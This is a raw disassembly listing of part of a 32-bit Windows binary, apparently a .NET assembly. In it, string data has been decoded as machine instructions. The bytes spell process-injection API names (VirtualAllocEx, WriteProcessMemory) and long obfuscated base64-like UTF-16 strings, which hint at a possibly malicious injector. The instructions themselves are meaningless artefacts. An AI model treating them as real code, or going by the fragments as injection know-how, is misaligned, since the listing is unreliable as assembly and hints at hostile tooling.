10003625:	33 70 67             	xor    0x67(%eax),%esi
10003628:	39 37                	cmp    %esi,(%edi)
1000362a:	76 75                	jbe    0x100036a1
1000362c:	69 6c 59 54 76 00 4b 	imul   $0x6a4b0076,0x54(%ecx,%ebx,2),%ebp
10003633:	6a 
10003634:	6f                   	outsl  %ds:(%esi),(%dx)
10003635:	51                   	push   %ecx
10003636:	47                   	inc    %edi
10003637:	6e                   	outsb  %ds:(%esi),(%dx)
10003638:	68 4e 68 48 64       	push   $0x6448684e
1000363d:	54                   	push   %esp
1000363e:	35 6d 52 57 4d       	xor    $0x4d57526d,%eax
10003643:	4c                   	dec    %esp
10003644:	78 73                	js     0x100036b9
10003646:	33 69 76             	xor    0x76(%ecx),%ebp
10003649:	00 5a 6d             	add    %bl,0x6d(%edx)
1000364c:	6a 51                	push   $0x51
1000364e:	47                   	inc    %edi
1000364f:	72 33                	jb     0x10003684
10003651:	32 32                	xor    (%edx),%dh
10003653:	63 6e 74             	arpl   %ebp,0x74(%esi)
10003656:	5a                   	pop    %edx
10003657:	78 4f                	js     0x100036a8
10003659:	5a                   	pop    %edx
1000365a:	77 00                	ja     0x1000365c
1000365c:	58                   	pop    %eax
1000365d:	42                   	inc    %edx
1000365e:	48                   	dec    %eax
1000365f:	61                   	popa
10003660:	46                   	inc    %esi
10003661:	57                   	push   %edi
10003662:	4c                   	dec    %esp
10003663:	52                   	push   %edx
10003664:	51                   	push   %ecx
10003665:	54                   	push   %esp
10003666:	43                   	inc    %ebx
10003667:	52                   	push   %edx
10003668:	4f                   	dec    %edi
10003669:	63 33                	arpl   %esi,(%ebx)
1000366b:	78 00                	js     0x1000366d
1000366d:	56                   	push   %esi
1000366e:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
10003675:	6c                   	insb   (%dx),%es:(%edi)
10003676:	6c                   	insb   (%dx),%es:(%edi)
10003677:	6f                   	outsl  %ds:(%esi),(%dx)
10003678:	63 45 78             	arpl   %eax,0x78(%ebp)
1000367b:	00 54 6f 41          	add    %dl,0x41(%edi,%ebp,2)
1000367f:	72 72                	jb     0x100036f3
10003681:	61                   	popa
10003682:	79 00                	jns    0x10003684
10003684:	43                   	inc    %ebx
10003685:	6f                   	outsl  %ds:(%esi),(%dx)
10003686:	70 79                	jo     0x10003701
10003688:	00 57 72             	add    %dl,0x72(%edi)
1000368b:	69 74 65 50 72 6f 63 	imul   $0x65636f72,0x50(%ebp,%eiz,2),%esi
10003692:	65 
10003693:	73 73                	jae    0x10003708
10003695:	4d                   	dec    %ebp
10003696:	65 6d                	gs insl (%dx),%es:(%edi)
10003698:	6f                   	outsl  %ds:(%esi),(%dx)
10003699:	72 79                	jb     0x10003714
1000369b:	00 43 72             	add    %al,0x72(%ebx)
1000369e:	65 61                	gs popa
100036a0:	74 65                	je     0x10003707
100036a2:	44                   	inc    %esp
100036a3:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
100036aa:	79 00                	jns    0x100036ac
100036ac:	6f                   	outsl  %ds:(%esi),(%dx)
100036ad:	70 5f                	jo     0x1000370e
100036af:	45                   	inc    %ebp
100036b0:	71 75                	jno    0x10003727
100036b2:	61                   	popa
100036b3:	6c                   	insb   (%dx),%es:(%edi)
100036b4:	69 74 79 00 00 82 e1 	imul   $0x4fe18200,0x0(%ecx,%edi,2),%esi
100036bb:	4f 
100036bc:	00 45 00             	add    %al,0x0(%ebp)
100036bf:	38 00                	cmp    %al,(%eax)
100036c1:	34 00                	xor    $0x0,%al
100036c3:	4d                   	dec    %ebp
100036c4:	00 6d 00             	add    %ch,0x0(%ebp)
100036c7:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
100036cb:	5a                   	pop    %edx
100036cc:	00 6d 00             	add    %ch,0x0(%ebp)
100036cf:	55                   	push   %ebp
100036d0:	00 35 00 4e 00 6c    	add    %dh,0x6c004e00
100036d6:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
100036da:	00 53 00             	add    %dl,0x0(%ebx)
100036dd:	6a 00                	push   $0x0
100036df:	68 00 50 00 4f       	push   $0x4f005000
100036e4:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
100036e8:	00 6e 00             	add    %ch,0x0(%esi)
100036eb:	51                   	push   %ecx
100036ec:	00 6d 00             	add    %ch,0x0(%ebp)
100036ef:	5a                   	pop    %edx
100036f0:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
100036f4:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
100036f8:	00 34 00             	add    %dh,(%eax,%eax,1)
100036fb:	54                   	push   %esp
100036fc:	00 7a 00             	add    %bh,0x0(%edx)
100036ff:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10003703:	5a                   	pop    %edx
10003704:	00 30                	add    %dh,(%eax)
10003706:	00 4a 00             	add    %cl,0x0(%edx)
10003709:	6d                   	insl   (%dx),%es:(%edi)
1000370a:	00 5a 00             	add    %bl,0x0(%edx)
1000370d:	54                   	push   %esp
1000370e:	00 6b 00             	add    %ch,0x0(%ebx)
10003711:	32 00                	xor    (%eax),%al
10003713:	61                   	popa
10003714:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
10003718:	00 48 00             	add    %cl,0x0(%eax)
1000371b:	4f                   	dec    %edi
1000371c:	00 45 00             	add    %al,0x0(%ebp)
1000371f:	38 00                	cmp    %al,(%eax)
10003721:	34 00                	xor    $0x0,%al
10003723:	4d                   	dec    %ebp
10003724:	00 6d 00             	add    %ch,0x0(%ebp)
10003727:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
1000372b:	5a                   	pop    %edx
1000372c:	00 6d 00             	add    %ch,0x0(%ebp)
1000372f:	55                   	push   %ebp
10003730:	00 35 00 4e 00 6a    	add    %dh,0x6a004e00
10003736:	00 68 00             	add    %ch,0x0(%eax)
10003739:	50                   	push   %eax
1000373a:	00 4f 00             	add    %cl,0x0(%edi)
1000373d:	44                   	inc    %esp
1000373e:	00 4a 00             	add    %cl,0x0(%edx)
10003741:	6e                   	outsb  %ds:(%esi),(%dx)
10003742:	00 51 00             	add    %dl,0x0(%ecx)
10003745:	6d                   	insl   (%dx),%es:(%edi)
10003746:	00 5a 00             	add    %bl,0x0(%edx)
10003749:	6c                   	insb   (%dx),%es:(%edi)
1000374a:	00 4f 00             	add    %cl,0x0(%edi)
1000374d:	54                   	push   %esp
1000374e:	00 5a 00             	add    %bl,0x0(%edx)
10003751:	57                   	push   %edi
10003752:	00 62 00             	add    %ah,0x0(%edx)
10003755:	56                   	push   %esi
10003756:	00 6f 00             	add    %ch,0x0(%edi)
10003759:	34 00                	xor    $0x0,%al
1000375b:	54                   	push   %esp
1000375c:	00 7a 00             	add    %bh,0x0(%edx)
1000375f:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10003763:	5a                   	pop    %edx
10003764:	00 30                	add    %dh,(%eax)
10003766:	00 4a 00             	add    %cl,0x0(%edx)
10003769:	6d                   	insl   (%dx),%es:(%edi)
1000376a:	00 5a 00             	add    %bl,0x0(%edx)
1000376d:	54                   	push   %esp
1000376e:	00 6b 00             	add    %ch,0x0(%ebx)
10003771:	32 00                	xor    (%eax),%al
10003773:	4f                   	dec    %edi
10003774:	00 45 00             	add    %al,0x0(%ebp)
10003777:	38 00                	cmp    %al,(%eax)
10003779:	34 00                	xor    $0x0,%al
1000377b:	4d                   	dec    %ebp
1000377c:	00 6d 00             	add    %ch,0x0(%ebp)
1000377f:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
10003783:	5a                   	pop    %edx
10003784:	00 6d 00             	add    %ch,0x0(%ebp)
10003787:	55                   	push   %ebp
10003788:	00 35 00 4e 00 6a    	add    %dh,0x6a004e00
1000378e:	00 4a 00             	add    %cl,0x0(%edx)
10003791:	6f                   	outsl  %ds:(%esi),(%dx)
10003792:	00 63 00             	add    %ah,0x0(%ebx)
10003795:	44                   	inc    %esp
10003796:	00 68 00             	add    %ch,0x0(%eax)
10003799:	50                   	push   %eax
1000379a:	00 4f 00             	add    %cl,0x0(%edi)
1000379d:	44                   	inc    %esp
1000379e:	00 4a 00             	add    %cl,0x0(%edx)
100037a1:	6e                   	outsb  %ds:(%esi),(%dx)
100037a2:	00 51 00             	add    %dl,0x0(%ecx)
100037a5:	6d                   	insl   (%dx),%es:(%edi)
100037a6:	00 5a 00             	add    %bl,0x0(%edx)
100037a9:	6c                   	insb   (%dx),%es:(%edi)
100037aa:	00 4f 00             	add    %cl,0x0(%edi)
100037ad:	54                   	push   %esp
100037ae:	00 59 00             	add    %bl,0x0(%ecx)
100037b1:	34 00                	xor    $0x0,%al
100037b3:	54                   	push   %esp
100037b4:	00 7a 00             	add    %bh,0x0(%edx)
100037b7:	67 00 79 00          	add    %bh,0x0(%bx,%di)
100037bb:	5a                   	pop    %edx
100037bc:	00 30                	add    %dh,(%eax)
100037be:	00 4a 00             	add    %cl,0x0(%edx)
100037c1:	6d                   	insl   (%dx),%es:(%edi)
100037c2:	00 5a 00             	add    %bl,0x0(%edx)
100037c5:	54                   	push   %esp
100037c6:	00 6b 00             	add    %ch,0x0(%ebx)
100037c9:	32 00                	xor    (%eax),%al
100037cb:	59                   	pop    %ecx
100037cc:	00 57 00             	add    %dl,0x0(%edi)
100037cf:	31 00                	xor    %eax,(%eax)
100037d1:	30 00                	xor    %al,(%eax)
100037d3:	4f                   	dec    %edi
100037d4:	00 45 00             	add    %al,0x0(%ebp)
100037d7:	38 00                	cmp    %al,(%eax)
100037d9:	34 00                	xor    $0x0,%al
100037db:	4d                   	dec    %ebp
100037dc:	00 6d 00             	add    %ch,0x0(%ebp)
100037df:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
100037e3:	5a                   	pop    %edx
100037e4:	00 6d 00             	add    %ch,0x0(%ebp)
100037e7:	55                   	push   %ebp
100037e8:	00 35 00 4e 00 6a    	add    %dh,0x6a004e00
100037ee:	00 68 00             	add    %ch,0x0(%eax)
100037f1:	50                   	push   %eax
100037f2:	00 4f 00             	add    %cl,0x0(%edi)
100037f5:	44                   	inc    %esp
100037f6:	00 4a 00             	add    %cl,0x0(%edx)
100037f9:	6e                   	outsb  %ds:(%esi),(%dx)
100037fa:	00 51 00             	add    %dl,0x0(%ecx)
100037fd:	6d                   	insl   (%dx),%es:(%edi)
100037fe:	00 5a 00             	add    %bl,0x0(%edx)
10003801:	6c                   	insb   (%dx),%es:(%edi)
10003802:	00 4f 00             	add    %cl,0x0(%edi)
10003805:	54                   	push   %esp
10003806:	00 5a 00             	add    %bl,0x0(%edx)
10003809:	7a 00                	jp     0x1000380b
1000380b:	59                   	pop    %ecx
1000380c:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
10003810:	00 34 00             	add    %dh,(%eax,%eax,1)
10003813:	54                   	push   %esp
10003814:	00 7a 00             	add    %bh,0x0(%edx)
10003817:	67 00 79 00          	add    %bh,0x0(%bx,%di)
1000381b:	5a                   	pop    %edx
1000381c:	00 30                	add    %dh,(%eax)
1000381e:	00 4a 00             	add    %cl,0x0(%edx)
10003821:	6d                   	insl   (%dx),%es:(%edi)
10003822:	00 5a 00             	add    %bl,0x0(%edx)
10003825:	54                   	push   %esp
10003826:	00 6b 00             	add    %ch,0x0(%ebx)
10003829:	32 00                	xor    (%eax),%al
1000382b:	4f                   	dec    %edi
1000382c:	00 45 00             	add    %al,0x0(%ebp)
1000382f:	38 00                	cmp    %al,(%eax)
10003831:	34 00                	xor    $0x0,%al
10003833:	4d                   	dec    %ebp
10003834:	00 6d 00             	add    %ch,0x0(%ebp)
10003837:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
1000383b:	5a                   	pop    %edx
1000383c:	00 6d 00             	add    %ch,0x0(%ebp)
1000383f:	55                   	push   %ebp
10003840:	00 35 00 4e 00 6a    	add    %dh,0x6a004e00
10003846:	00 56 00             	add    %dl,0x0(%esi)
10003849:	32 00                	xor    (%eax),%al
1000384b:	59                   	pop    %ecx
1000384c:	00 7a 00             	add    %bh,0x0(%edx)
1000384f:	68 00 50 00 4f       	push   $0x4f005000
10003854:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
10003858:	00 6e 00             	add    %ch,0x0(%esi)
1000385b:	51                   	push   %ecx
1000385c:	00 6d 00             	add    %ch,0x0(%ebp)
1000385f:	5a                   	pop    %edx
10003860:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003864:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
10003868:	00 34 00             	add    %dh,(%eax,%eax,1)
1000386b:	54                   	push   %esp
1000386c:	00 7a 00             	add    %bh,0x0(%edx)
1000386f:	67 00 79 00          	add    %bh,0x0(%bx,%di)
10003873:	5a                   	pop    %edx
10003874:	00 30                	add    %dh,(%eax)
10003876:	00 4a 00             	add    %cl,0x0(%edx)
10003879:	6d                   	insl   (%dx),%es:(%edi)
1000387a:	00 5a 00             	add    %bl,0x0(%edx)
1000387d:	54                   	push   %esp
1000387e:	00 6b 00             	add    %ch,0x0(%ebx)
10003881:	32 00                	xor    (%eax),%al
10003883:	53                   	push   %ebx
10003884:	00 45 00             	add    %al,0x0(%ebp)
10003887:	5a                   	pop    %edx
10003888:	00 35 00 4f 00 45    	add    %dh,0x45004f00
1000388e:	00 38                	add    %bh,(%eax)
10003890:	00 34 00             	add    %dh,(%eax,%eax,1)
10003893:	4d                   	dec    %ebp
10003894:	00 6d 00             	add    %ch,0x0(%ebp)
10003897:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
1000389b:	5a                   	pop    %edx
1000389c:	00 6d 00             	add    %ch,0x0(%ebp)
1000389f:	55                   	push   %ebp
100038a0:	00 35 00 4e 00 6a    	add    %dh,0x6a004e00
100038a6:	00 68 00             	add    %ch,0x0(%eax)
100038a9:	50                   	push   %eax
100038aa:	00 4f 00             	add    %cl,0x0(%edi)
100038ad:	44                   	inc    %esp
100038ae:	00 4a 00             	add    %cl,0x0(%edx)
100038b1:	6e                   	outsb  %ds:(%esi),(%dx)
100038b2:	00 51 00             	add    %dl,0x0(%ecx)
100038b5:	6d                   	insl   (%dx),%es:(%edi)
100038b6:	00 5a 00             	add    %bl,0x0(%edx)
100038b9:	6c                   	insb   (%dx),%es:(%edi)
100038ba:	00 4f 00             	add    %cl,0x0(%edi)
100038bd:	54                   	push   %esp
100038be:	00 5a 00             	add    %bl,0x0(%edx)
100038c1:	6a 00                	push   $0x0
100038c3:	4d                   	dec    %ebp
100038c4:	00 31                	add    %dh,(%ecx)
100038c6:	00 49 00             	add    %cl,0x0(%ecx)
100038c9:	34 00                	xor    $0x0,%al
100038cb:	54                   	push   %esp
100038cc:	00 7a 00             	add    %bh,0x0(%edx)
100038cf:	67 00 79 00          	add    %bh,0x0(%bx,%di)
100038d3:	5a                   	pop    %edx
100038d4:	00 30                	add    %dh,(%eax)
100038d6:	00 4a 00             	add    %cl,0x0(%edx)
100038d9:	6d                   	insl   (%dx),%es:(%edi)
100038da:	00 5a 00             	add    %bl,0x0(%edx)
100038dd:	54                   	push   %esp
100038de:	00 6b 00             	add    %ch,0x0(%ebx)
100038e1:	32 00                	xor    (%eax),%al
100038e3:	4f                   	dec    %edi
100038e4:	00 45 00             	add    %al,0x0(%ebp)
100038e7:	38 00                	cmp    %al,(%eax)
100038e9:	34 00                	xor    $0x0,%al
100038eb:	4d                   	dec    %ebp
100038ec:	00 6d 00             	add    %ch,0x0(%ebp)
100038ef:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
100038f3:	5a                   	pop    %edx
100038f4:	00 6d 00             	add    %ch,0x0(%ebp)
100038f7:	55                   	push   %ebp
100038f8:	00 35 00 4e 00 6a    	add    %dh,0x6a004e00
100038fe:	00 46 00             	add    %al,0x0(%esi)
10003901:	6b 00 62             	imul   $0x62,(%eax),%eax
10003904:	00 6a 00             	add    %ch,0x0(%edx)
10003907:	68 00 50 00 4f       	push   $0x4f005000
1000390c:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
10003910:	00 6e 00             	add    %ch,0x0(%esi)
10003913:	51                   	push   %ecx
10003914:	00 6d 00             	add    %ch,0x0(%ebp)
10003917:	5a                   	pop    %edx
10003918:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
1000391c:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
10003920:	00 34 00             	add    %dh,(%eax,%eax,1)
10003923:	54                   	push   %esp
10003924:	00 7a 00             	add    %bh,0x0(%edx)
10003927:	67 00 79 00          	add    %bh,0x0(%bx,%di)
1000392b:	5a                   	pop    %edx
1000392c:	00 30                	add    %dh,(%eax)
1000392e:	00 4a 00             	add    %cl,0x0(%edx)
10003931:	6d                   	insl   (%dx),%es:(%edi)
10003932:	00 5a 00             	add    %bl,0x0(%edx)
10003935:	54                   	push   %esp
10003936:	00 6b 00             	add    %ch,0x0(%ebx)
10003939:	32 00                	xor    (%eax),%al
1000393b:	5a                   	pop    %edx
1000393c:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003940:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
10003944:	00 45 00             	add    %al,0x0(%ebp)
10003947:	38 00                	cmp    %al,(%eax)
10003949:	34 00                	xor    $0x0,%al
1000394b:	4d                   	dec    %ebp
1000394c:	00 6d 00             	add    %ch,0x0(%ebp)
1000394f:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
10003953:	5a                   	pop    %edx
10003954:	00 6d 00             	add    %ch,0x0(%ebp)
10003957:	55                   	push   %ebp
10003958:	00 35 00 4e 00 6a    	add    %dh,0x6a004e00
1000395e:	00 68 00             	add    %ch,0x0(%eax)
10003961:	50                   	push   %eax
10003962:	00 4f 00             	add    %cl,0x0(%edi)
10003965:	44                   	inc    %esp
10003966:	00 4a 00             	add    %cl,0x0(%edx)
10003969:	6e                   	outsb  %ds:(%esi),(%dx)
1000396a:	00 51 00             	add    %dl,0x0(%ecx)
1000396d:	6d                   	insl   (%dx),%es:(%edi)
1000396e:	00 5a 00             	add    %bl,0x0(%edx)
10003971:	6c                   	insb   (%dx),%es:(%edi)
10003972:	00 4f 00             	add    %cl,0x0(%edi)
10003975:	54                   	push   %esp
10003976:	00 5a 00             	add    %bl,0x0(%edx)
10003979:	59                   	pop    %ecx
1000397a:	00 62 00             	add    %ah,0x0(%edx)
1000397d:	7a 00                	jp     0x1000397f
1000397f:	30 00                	xor    %al,(%eax)
10003981:	34 00                	xor    $0x0,%al
10003983:	54                   	push   %esp
10003984:	00 7a 00             	add    %bh,0x0(%edx)
10003987:	67 00 79 00          	add    %bh,0x0(%bx,%di)
1000398b:	5a                   	pop    %edx
1000398c:	00 30                	add    %dh,(%eax)
1000398e:	00 4a 00             	add    %cl,0x0(%edx)
10003991:	6d                   	insl   (%dx),%es:(%edi)
10003992:	00 5a 00             	add    %bl,0x0(%edx)
10003995:	54                   	push   %esp
10003996:	00 6b 00             	add    %ch,0x0(%ebx)
10003999:	32 00                	xor    (%eax),%al
1000399b:	00 15 38 00 4f 00    	add    %dl,0x4f0038
100039a1:	38 00                	cmp    %al,(%eax)
100039a3:	32 00                	xor    (%eax),%al
100039a5:	67 00 42 00          	add    %al,0x0(%bp,%si)
100039a9:	66 00 65 00          	data16 add %ah,0x0(%ebp)
100039ad:	39 00                	cmp    %eax,(%eax)
100039af:	36 00 00             	add    %al,%ss:(%eax)
100039b2:	01 00                	add    %eax,(%eax)
100039b4:	81 71 52 00 6a 00 52 	xorl   $0x52006a00,0x52(%ecx)
100039bb:	00 7a 00             	add    %bh,0x0(%edx)
100039be:	61                   	popa
100039bf:	00 31                	add    %dh,(%ecx)
100039c1:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
100039c5:	00 63 00             	add    %ah,0x0(%ebx)
100039c8:	6c                   	insb   (%dx),%es:(%edi)
100039c9:	00 4e 00             	add    %cl,0x0(%esi)
100039cc:	50                   	push   %eax
100039cd:	00 61 00             	add    %ah,0x0(%ecx)
100039d0:	54                   	push   %esp
100039d1:	00 42 00             	add    %al,0x0(%edx)
100039d4:	4d                   	dec    %ebp
100039d5:	00 4d 00             	add    %cl,0x0(%ebp)
100039d8:	30 00                	xor    %al,(%eax)
100039da:	59                   	pop    %ecx
100039db:	00 30                	add    %dh,(%eax)
100039dd:	00 63 00             	add    %ah,0x0(%ebx)
100039e0:	32 00                	xor    (%eax),%al
100039e2:	74 00                	je     0x100039e4
100039e4:	5a                   	pop    %edx
100039e5:	00 52 00             	add    %dl,0x0(%edx)
100039e8:	48                   	dec    %eax
100039e9:	00 4a 00             	add    %cl,0x0(%edx)
100039ec:	54                   	push   %esp
100039ed:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
100039f1:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
100039f5:	00 4e 00             	add    %cl,0x0(%esi)
100039f8:	48                   	dec    %eax
100039f9:	00 4e 00             	add    %cl,0x0(%esi)
100039fc:	72 00                	jb     0x100039fe
100039fe:	57                   	push   %edi
100039ff:	00 55 00             	add    %dl,0x0(%ebp)
10003a02:	52                   	push   %edx
10003a03:	00 79 00             	add    %bh,0x0(%ecx)
10003a06:	55                   	push   %ebp
10003a07:	00 30                	add    %dh,(%eax)
10003a09:	00 39                	add    %bh,(%ecx)
10003a0b:	00 70 00             	add    %dh,0x0(%eax)
10003a0e:	55                   	push   %ebp
10003a0f:	00 58 00             	add    %bl,0x0(%eax)
10003a12:	5a                   	pop    %edx
10003a13:	00 30                	add    %dh,(%eax)
10003a15:	00 52 00             	add    %dl,0x0(%edx)
10003a18:	6a 00                	push   $0x0
10003a1a:	52                   	push   %edx
10003a1b:	00 7a 00             	add    %bh,0x0(%edx)
10003a1e:	61                   	popa
10003a1f:	00 31                	add    %dh,(%ecx)
10003a21:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
10003a25:	00 63 00             	add    %ah,0x0(%ebx)
10003a28:	6c                   	insb   (%dx),%es:(%edi)
10003a29:	00 4e 00             	add    %cl,0x0(%esi)
10003a2c:	50                   	push   %eax
10003a2d:	00 61 00             	add    %ah,0x0(%ecx)
10003a30:	55                   	push   %ebp
10003a31:	00 59 00             	add    %bl,0x0(%ecx)
10003a34:	30 00                	xor    %al,(%eax)
10003a36:	63 00                	arpl   %eax,(%eax)
10003a38:	32 00                	xor    (%eax),%al
10003a3a:	74 00                	je     0x10003a3c
10003a3c:	5a                   	pop    %edx
10003a3d:	00 52 00             	add    %dl,0x0(%edx)
10003a40:	48                   	dec    %eax
10003a41:	00 4a 00             	add    %cl,0x0(%edx)
10003a44:	54                   	push   %esp
10003a45:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003a49:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
10003a4d:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
10003a51:	00 42 00             	add    %al,0x0(%edx)
10003a54:	47                   	inc    %edi
10003a55:	00 4e 00             	add    %cl,0x0(%esi)
10003a58:	48                   	dec    %eax
10003a59:	00 4e 00             	add    %cl,0x0(%esi)
10003a5c:	72 00                	jb     0x10003a5e
10003a5e:	57                   	push   %edi
10003a5f:	00 55 00             	add    %dl,0x0(%ebp)
10003a62:	52                   	push   %edx
10003a63:	00 79 00             	add    %bh,0x0(%ecx)
10003a66:	55                   	push   %ebp
10003a67:	00 30                	add    %dh,(%eax)
10003a69:	00 39                	add    %bh,(%ecx)
10003a6b:	00 70 00             	add    %dh,0x0(%eax)
10003a6e:	52                   	push   %edx
10003a6f:	00 6a 00             	add    %ch,0x0(%edx)
10003a72:	52                   	push   %edx
10003a73:	00 7a 00             	add    %bh,0x0(%edx)
10003a76:	61                   	popa
10003a77:	00 31                	add    %dh,(%ecx)
10003a79:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
10003a7d:	00 63 00             	add    %ah,0x0(%ebx)
10003a80:	6c                   	insb   (%dx),%es:(%edi)
10003a81:	00 4e 00             	add    %cl,0x0(%esi)
10003a84:	50                   	push   %eax
10003a85:	00 61 00             	add    %ah,0x0(%ecx)
10003a88:	56                   	push   %esi
10003a89:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
10003a8d:	00 55 00             	add    %dl,0x0(%ebp)
10003a90:	6b 00 59             	imul   $0x59,(%eax),%eax
10003a93:	00 30                	add    %dh,(%eax)
10003a95:	00 63 00             	add    %ah,0x0(%ebx)
10003a98:	32 00                	xor    (%eax),%al
10003a9a:	74 00                	je     0x10003a9c
10003a9c:	5a                   	pop    %edx
10003a9d:	00 52 00             	add    %dl,0x0(%edx)
10003aa0:	48                   	dec    %eax
10003aa1:	00 4a 00             	add    %cl,0x0(%edx)
10003aa4:	54                   	push   %esp
10003aa5:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003aa9:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
10003aad:	00 4e 00             	add    %cl,0x0(%esi)
10003ab0:	48                   	dec    %eax
10003ab1:	00 4e 00             	add    %cl,0x0(%esi)
10003ab4:	72 00                	jb     0x10003ab6
10003ab6:	57                   	push   %edi
10003ab7:	00 55 00             	add    %dl,0x0(%ebp)
10003aba:	52                   	push   %edx
10003abb:	00 79 00             	add    %bh,0x0(%ecx)
10003abe:	55                   	push   %ebp
10003abf:	00 30                	add    %dh,(%eax)
10003ac1:	00 39                	add    %bh,(%ecx)
10003ac3:	00 70 00             	add    %dh,0x0(%eax)
10003ac6:	5a                   	pop    %edx
10003ac7:	00 31                	add    %dh,(%ecx)
10003ac9:	00 45 00             	add    %al,0x0(%ebp)
10003acc:	39 00                	cmp    %eax,(%eax)
10003ace:	52                   	push   %edx
10003acf:	00 6a 00             	add    %ch,0x0(%edx)
10003ad2:	52                   	push   %edx
10003ad3:	00 7a 00             	add    %bh,0x0(%edx)
10003ad6:	61                   	popa
10003ad7:	00 31                	add    %dh,(%ecx)
10003ad9:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
10003add:	00 63 00             	add    %ah,0x0(%ebx)
10003ae0:	6c                   	insb   (%dx),%es:(%edi)
10003ae1:	00 4e 00             	add    %cl,0x0(%esi)
10003ae4:	50                   	push   %eax
10003ae5:	00 61 00             	add    %ah,0x0(%ecx)
10003ae8:	55                   	push   %ebp
10003ae9:	00 59 00             	add    %bl,0x0(%ecx)
10003aec:	30 00                	xor    %al,(%eax)
10003aee:	63 00                	arpl   %eax,(%eax)
10003af0:	32 00                	xor    (%eax),%al
10003af2:	74 00                	je     0x10003af4
10003af4:	5a                   	pop    %edx
10003af5:	00 52 00             	add    %dl,0x0(%edx)
10003af8:	48                   	dec    %eax
10003af9:	00 4a 00             	add    %cl,0x0(%edx)
10003afc:	54                   	push   %esp
10003afd:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
10003b01:	00 6b 00             	add    %ch,0x0(%ebx)
10003b04:	39 00                	cmp    %eax,(%eax)
10003b06:	52                   	push   %edx
10003b07:	00 6a 00             	add    %ch,0x0(%edx)
10003b0a:	52                   	push   %edx
10003b0b:	00 7a 00             	add    %bh,0x0(%edx)
10003b0e:	61                   	popa
10003b0f:	00 31                	add    %dh,(%ecx)
10003b11:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
10003b15:	00 63 00             	add    %ah,0x0(%ebx)
10003b18:	6c                   	insb   (%dx),%es:(%edi)
10003b19:	00 4e 00             	add    %cl,0x0(%esi)
10003b1c:	50                   	push   %eax
10003b1d:	00 61 00             	add    %ah,0x0(%ecx)
10003b20:	51                   	push   %ecx
10003b21:	00 3d 00 3d 00 00    	add    %bh,0x3d00
10003b27:	15 46 00 34 00       	adc    $0x340046,%eax
10003b2c:	73 00                	jae    0x10003b2e
10003b2e:	6b 00 59             	imul   $0x59,(%eax),%eax
10003b31:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
10003b35:	00 53 00             	add    %dl,0x0(%ebx)
10003b38:	4f                   	dec    %edi
10003b39:	00 69 00             	add    %ch,0x0(%ecx)
10003b3c:	00 81 b1 4d 00 55    	add    %al,0x55004db1(%ecx)
10003b42:	00 51 00             	add    %dl,0x0(%ecx)
10003b45:	31 00                	xor    %eax,(%eax)
10003b47:	4e                   	dec    %esi
10003b48:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
10003b4c:	00 32                	add    %dh,(%edx)
10003b4e:	00 5a 00             	add    %bl,0x0(%edx)
10003b51:	6b 00 39             	imul   $0x39,(%eax),%eax
10003b54:	00 46 00             	add    %al,0x0(%esi)
10003b57:	4f                   	dec    %edi
10003b58:	00 46 00             	add    %al,0x0(%esi)
10003b5b:	6c                   	insb   (%dx),%es:(%edi)
10003b5c:	00 59 00             	add    %bl,0x0(%ecx)
10003b5f:	54                   	push   %esp
10003b60:	00 6a 00             	add    %ch,0x0(%edx)
10003b63:	46                   	inc    %esi
10003b64:	00 45 00             	add    %al,0x0(%ebp)
10003b67:	4e                   	dec    %esi
10003b68:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
10003b6c:	00 30                	add    %dh,(%eax)
10003b6e:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10003b72:	00 5a 00             	add    %bl,0x0(%edx)
10003b75:	50                   	push   %eax
10003b76:	00 52 00             	add    %dl,0x0(%edx)
10003b79:	54                   	push   %esp
10003b7a:	00 67 00             	add    %ah,0x0(%edi)
10003b7d:	78 00                	js     0x10003b7f
10003b7f:	52                   	push   %edx
10003b80:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
10003b84:	00 30                	add    %dh,(%eax)
10003b86:	00 4e 00             	add    %cl,0x0(%esi)
10003b89:	48                   	dec    %eax
10003b8a:	00 5a 00             	add    %bl,0x0(%edx)
10003b8d:	6d                   	insl   (%dx),%es:(%edi)
